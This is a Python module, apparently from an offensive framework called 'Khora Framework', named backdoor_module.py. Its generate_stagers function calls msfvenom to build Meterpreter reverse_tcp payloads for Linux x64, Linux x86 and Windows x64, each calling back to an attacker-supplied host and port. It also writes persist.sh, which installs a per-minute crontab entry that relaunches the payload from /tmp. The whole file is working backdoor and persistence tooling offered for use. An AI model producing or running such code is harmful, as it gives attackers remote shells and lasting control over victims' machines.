# modules/backdoor_module.py
import subprocess
import os

def generate_stagers(lhost, lport=4444):
    os.makedirs("payloads", exist_ok=True)
    
    payloads = [
        # Linux x64 Meterpreter
        ["msfvenom", "-p", "linux/x64/meterpreter/reverse_tcp",
         "LHOST=" + lhost, "LPORT=" + str(lport),
         "-f", "elf", "-o", "payloads/linux_x64_meter.elf"],
        
        # Linux x86 Meterpreter
        ["msfvenom", "-p", "linux/x86/meterpreter/reverse_tcp",
         "LHOST=" + lhost, "LPORT=" + str(lport),
         "-f", "elf", "-o", "payloads/linux_x86_meter.elf"],
        
        # Windows x64 Meterpreter
        ["msfvenom", "-p", "windows/x64/meterpreter/reverse_tcp",
         "LHOST=" + lhost, "LPORT=" + str(lport),
         "-f", "exe", "-o", "payloads/win_x64_meter.exe"]
    ]
    
    for payload in payloads:
        try:
            subprocess.run(payload, check=True, capture_output=True)
            print(f"[+] Generated: {payload[-1]}")
        except FileNotFoundError:
            print("[!] msfvenom not found - skipping payload generation")
        except subprocess.CalledProcessError:
            print("[!] Payload generation failed - msfvenom may not be installed")
    
    # Persistence script
    persist_content = f"""#!/bin/bash
echo '* * * * * /tmp/linux_x64_meter.elf' | crontab -
chmod +x /tmp/linux_x64_meter.elf
/tmp/linux_x64_meter.elf &
"""
    with open("payloads/persist.sh", "w") as f:
        f.write(persist_content)
    
    print("[+] Stagers generated: payloads/*.elf *.exe persist.sh")

def run(target, lhost, lport=4444):
    """Khora Framework entrypoint"""
    print(f"[+] Backdoor module: generating stagers for {lhost}:{lport}")
    generate_stagers(lhost, lport)
    print("[+] Payloads ready in payloads/ directory")